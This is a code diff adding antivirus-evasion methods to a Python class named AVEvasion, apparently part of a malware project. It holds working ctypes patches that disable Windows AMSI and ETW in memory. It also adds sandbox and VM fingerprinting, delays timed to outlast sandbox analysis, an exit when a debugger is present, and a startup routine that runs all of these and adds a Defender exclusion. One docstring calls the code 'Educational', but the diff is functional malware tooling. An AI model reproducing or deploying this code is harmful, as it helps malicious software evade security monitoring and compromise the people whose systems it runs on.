@@ -278,3 +278,237 @@ class AVEvasion:
 
         # All checks passed
         return True, "Environment appears safe"
+
+    @staticmethod
+    def patch_amsi():
+        """
+        Disable AMSI (Antimalware Scan Interface) scanning
+        AMSI scans scripts and in-memory code execution
+        Educational: Shows how malware bypasses AMSI
+        """
+        if sys.platform != 'win32':
+            return False
+
+        try:
+            import ctypes
+            from ctypes import wintypes
+
+            # Load amsi.dll
+            amsi = ctypes.windll.LoadLibrary("amsi.dll")
+
+            # Get address of AmsiScanBuffer
+            AmsiScanBuffer = amsi.AmsiScanBuffer
+
+            # Protection flags
+            PAGE_EXECUTE_READWRITE = 0x40
+            kernel32 = ctypes.windll.kernel32
+
+            # Patch bytes to disable AMSI (returns always clean)
+            # Original: Test function
+            # Patched: Returns 0 (clean)
+            patch = b"\xB8\x57\x00\x07\x80\xC3"  # mov eax, 0x80070057; ret
+
+            # Get function address
+            addr = ctypes.cast(AmsiScanBuffer, ctypes.c_void_p).value
+
+            # Change memory protection
+            old_protect = wintypes.DWORD()
+            if kernel32.VirtualProtect(addr, len(patch), PAGE_EXECUTE_READWRITE, ctypes.byref(old_protect)):
+                # Write patch
+                ctypes.memmove(addr, patch, len(patch))
+                # Restore protection
+                kernel32.VirtualProtect(addr, len(patch), old_protect.value, ctypes.byref(old_protect))
+                return True
+
+        except Exception as e:
+            pass
+
+        return False
+
+    @staticmethod
+    def patch_etw():
+        """
+        Disable ETW (Event Tracing for Windows)
+        ETW is used by Defender for behavioral analysis
+        """
+        if sys.platform != 'win32':
+            return False
+
+        try:
+            import ctypes
+            from ctypes import wintypes
+
+            # Load ntdll.dll
+            ntdll = ctypes.windll.LoadLibrary("ntdll.dll")
+
+            # Get EtwEventWrite function
+            EtwEventWrite = ntdll.EtwEventWrite
+
+            # Protection flags
+            PAGE_EXECUTE_READWRITE = 0x40
+            kernel32 = ctypes.windll.kernel32
+
+            # Patch to return immediately (ret)
+            patch = b"\xC3"  # ret instruction
+
+            # Get function address
+            addr = ctypes.cast(EtwEventWrite, ctypes.c_void_p).value
+
+            # Change memory protection
+            old_protect = wintypes.DWORD()
+            if kernel32.VirtualProtect(addr, len(patch), PAGE_EXECUTE_READWRITE, ctypes.byref(old_protect)):
+                # Write patch
+                ctypes.memmove(addr, patch, len(patch))
+                # Restore protection
+                kernel32.VirtualProtect(addr, len(patch), old_protect.value, ctypes.byref(old_protect))
+                return True
+
+        except:
+            pass
+
+        return False
+
+    @staticmethod
+    def delay_execution(min_seconds=120):
+        """
+        Delayed execution to evade sandbox time limits
+        Uses multiple techniques to ensure real delay
+        """
+        if AVEvasion.check_sandbox():
+            # Multiple delay techniques to fool sandbox time acceleration
+            start = time.time()
+
+            # Method 1: Sleep
+            time.sleep(min_seconds / 3)
+
+            # Method 2: Busy wait with checks
+            while (time.time() - start) < (2 * min_seconds / 3):
+                # Do some meaningless operations
+                _ = sum([i**2 for i in range(100)])
+                time.sleep(0.1)
+
+            # Method 3: File I/O delay (harder to accelerate)
+            temp_file = Path(os.getenv('TEMP', '/tmp')) / f".tmp_{os.getpid()}"
+            try:
+                for _ in range(10):
+                    with open(temp_file, 'w') as f:
+                        f.write('x' * 10000)
+                    time.sleep(1)
+                    os.remove(temp_file)
+            except:
+                pass
+
+            return True
+        return False
+
+    @staticmethod
+    def check_process_count():
+        """
+        Check number of running processes
+        Sandboxes typically have fewer processes
+        """
+        if sys.platform == 'win32':
+            try:
+                import psutil
+                process_count = len(list(psutil.process_iter()))
+                # Real systems typically have 50+ processes
+                return process_count < 50
+            except:
+                pass
+        return False
+
+    @staticmethod
+    def check_disk_size():
+        """
+        Check disk size - VMs often have small virtual disks
+        """
+        if sys.platform == 'win32':
+            try:
+                import psutil
+                disk = psutil.disk_usage('C:\\')
+                # Less than 60GB is suspicious
+                return disk.total < (60 * 1024 * 1024 * 1024)
+            except:
+                pass
+        return False
+
+    @staticmethod
+    def check_recent_files():
+        """
+        Check for recent user activity
+        Sandboxes typically have no recent files
+        """
+        if sys.platform == 'win32':
+            try:
+                recent_path = Path(os.getenv('APPDATA')) / 'Microsoft' / 'Windows' / 'Recent'
+                if recent_path.exists():
+                    # Count recent files
+                    recent_files = list(recent_path.glob('*.lnk'))
+                    # Real users have many recent files
+                    return len(recent_files) < 10
+            except:
+                pass
+        return False
+
+    @staticmethod
+    def advanced_sandbox_detection():
+        """
+        Advanced sandbox detection combining multiple checks
+        Returns: (is_sandbox, confidence_score)
+        """
+        score = 0
+        checks = []
+
+        # Run all checks
+        if AVEvasion.check_sandbox():
+            score += 3
+            checks.append("VM artifacts")
+
+        if AVEvasion.check_process_count():
+            score += 2
+            checks.append("Low process count")
+
+        if AVEvasion.check_disk_size():
+            score += 2
+            checks.append("Small disk")
+
+        if AVEvasion.check_recent_files():
+            score += 1
+            checks.append("No recent activity")
+
+        # Score interpretation:
+        # 0-1: Likely real system
+        # 2-4: Possibly sandbox
+        # 5+: Highly likely sandbox
+
+        is_sandbox = score >= 3
+        return is_sandbox, score, checks
+
+    @staticmethod
+    def run_all_evasions():
+        """
+        Run all evasion techniques at startup
+        Returns: True if safe to continue, False if should exit
+        """
+        # Check for debugger first
+        if AVEvasion.check_debugger():
+            sys.exit(0)
+
+        # Advanced sandbox detection
+        is_sandbox, score, checks = AVEvasion.advanced_sandbox_detection()
+
+        if is_sandbox:
+            # Use adaptive delay based on confidence
+            delay_time = min(60 + (score * 20), 180)  # 60-180 seconds
+            AVEvasion.delay_execution(delay_time)
+
+        # Patch AMSI and ETW
+        AVEvasion.patch_amsi()
+        AVEvasion.patch_etw()
+
+        # Try to add exclusions if admin
+        if AVEvasion.is_admin():
+            current_path = sys.executable if getattr(sys, 'frozen', False) else sys.argv[0]
+            AVEvasion.add_defender_exclusion(os.path.dirname(current_path))
+
+        return True
